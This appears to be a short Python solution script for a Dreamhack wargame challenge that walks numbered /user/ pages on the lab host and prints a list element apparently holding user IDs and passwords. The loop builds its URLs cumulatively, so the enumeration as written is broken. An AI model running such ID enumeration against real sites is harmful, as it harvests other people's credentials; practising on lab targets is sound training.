
import requests
from bs4 import BeautifulSoup
from time import sleep
url = "http://host1.dreamhack.games:8265/user/"

for x in range(1,100):
	try:
		url += str(x)
		r = requests.get(url)
		r = r.text

		soup = BeautifulSoup(r, "html.parser")
		idpw = soup.find_all("ul")[2]
		print(idpw)
	except:
		continue
